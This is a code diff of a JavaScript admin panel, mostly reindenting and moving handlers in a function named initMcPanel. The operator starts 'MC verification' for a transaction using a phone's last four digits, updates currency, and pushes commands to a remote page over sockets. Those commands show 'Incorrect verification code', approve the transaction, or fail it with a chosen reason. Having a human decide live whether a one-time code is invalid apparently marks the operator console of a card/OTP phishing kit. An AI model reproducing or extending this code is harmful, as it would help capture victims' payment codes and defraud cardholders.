@@ -2913,11 +2913,11 @@ function initMcPanel() {
         phoneLastFour: phoneLastFour
       });
       
-      // Update currency if needed
-      socket.emit('update_mc_currency', {
-        invoiceId: currentMcInvoiceId,
-        currency: currency
-      });
+ // Update currency if needed
+socket.emit('update_mc_currency', {
+  invoiceId: currentMcInvoiceId,
+  currency: currency
+});
     }, 1000);
     
     // Set button to loading state
@@ -2930,78 +2930,76 @@ function initMcPanel() {
       startBtn.innerHTML = 'Start Verification';
       startBtn.disabled = false;
     }, 3000);
+    
+    showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
   });
-        
-        showMessage('success', 'MC verification started for transaction ' + currentMcInvoiceId);
-      });
-      
-      // Invalid OTP button
-      document.getElementById('mcOtpInvalidBtn').addEventListener('click', () => {
-        if (!currentMcInvoiceId) return;
-        
-        socket.emit('admin_command', {
-          command: 'show_otp_error',
-          invoiceId: currentMcInvoiceId,
-          message: 'Incorrect verification code. Please try again.'
-        });
-        
-        showMessage('success', 'OTP marked as invalid');
-      });
-      
-      // Success button
-      document.getElementById('mcOtpSuccessBtn').addEventListener('click', () => {
-        if (!currentMcInvoiceId) return;
-        
-        socket.emit('admin_command', {
-          command: 'verification_success',
-          invoiceId: currentMcInvoiceId
-        });
-        
-        // Close the panel
-        document.getElementById('mcOtpPanel').classList.add('hidden');
-        currentMcInvoiceId = null;
-        
-        // Reload transactions
-        loadTransactions();
-        
-        showMessage('success', 'Transaction approved successfully');
-      });
-      
-      // Fail options button
-      document.getElementById('mcFailOptionsBtn').addEventListener('click', () => {
-        const failOptions = document.getElementById('mcFailOptions');
-        failOptions.style.display = failOptions.style.display === 'none' ? 'block' : 'none';
-      });
-      
-      // Fail with reason button
-      document.getElementById('mcFailWithReasonBtn').addEventListener('click', () => {
-        if (!currentMcInvoiceId) return;
-        
-        const reason = document.getElementById('mcFailReasonDropdown').value;
-        
-     socket.emit('admin_command', {
-          command: 'verification_failed',
-          invoiceId: currentMcInvoiceId,
-          reason: reason
-        });
-        
-        // Close the panel
-        document.getElementById('mcOtpPanel').classList.add('hidden');
-        currentMcInvoiceId = null;
-        
-        // Reload transactions
-        loadTransactions();
-        
-        showMessage('success', `Transaction failed with reason: ${reason}`);
-      });
-      
-      // Close panel button
-      document.getElementById('mcClosePanelBtn').addEventListener('click', () => {
-        document.getElementById('mcOtpPanel').classList.add('hidden');
-        currentMcInvoiceId = null;
-      });
-    }
-
+  
+  // Invalid OTP button
+  document.getElementById('mcOtpInvalidBtn').addEventListener('click', () => {
+    if (!currentMcInvoiceId) return;
+    
+    socket.emit('admin_command', {
+      command: 'show_otp_error',
+      invoiceId: currentMcInvoiceId,
+      message: 'Incorrect verification code. Please try again.'
+    });
+    
+    showMessage('success', 'OTP marked as invalid');
+  });
+  
+  // Success button
+  document.getElementById('mcOtpSuccessBtn').addEventListener('click', () => {
+    if (!currentMcInvoiceId) return;
+    
+    socket.emit('admin_command', {
+      command: 'verification_success',
+      invoiceId: currentMcInvoiceId
+    });
+    
+    // Close the panel
+    document.getElementById('mcOtpPanel').classList.add('hidden');
+    currentMcInvoiceId = null;
+    
+    // Reload transactions
+    loadTransactions();
+    
+    showMessage('success', 'Transaction approved successfully');
+  });
+  
+  // Fail options button
+  document.getElementById('mcFailOptionsBtn').addEventListener('click', () => {
+    const failOptions = document.getElementById('mcFailOptions');
+    failOptions.style.display = failOptions.style.display === 'none' ? 'block' : 'none';
+  });
+  
+  // Fail with reason button
+  document.getElementById('mcFailWithReasonBtn').addEventListener('click', () => {
+    if (!currentMcInvoiceId) return;
+    
+    const reason = document.getElementById('mcFailReasonDropdown').value;
+    
+    socket.emit('admin_command', {
+      command: 'verification_failed',
+      invoiceId: currentMcInvoiceId,
+      reason: reason
+    });
+    
+    // Close the panel
+    document.getElementById('mcOtpPanel').classList.add('hidden');
+    currentMcInvoiceId = null;
+    
+    // Reload transactions
+    loadTransactions();
+    
+    showMessage('success', `Transaction failed with reason: ${reason}`);
+  });
+  
+  // Close panel button
+  document.getElementById('mcClosePanelBtn').addEventListener('click', () => {
+    document.getElementById('mcOtpPanel').classList.add('hidden');
+    currentMcInvoiceId = null;
+  });
+}
     // Debug MC Verification issues
     function debugMcVerification() {
       // Listen for all socket events
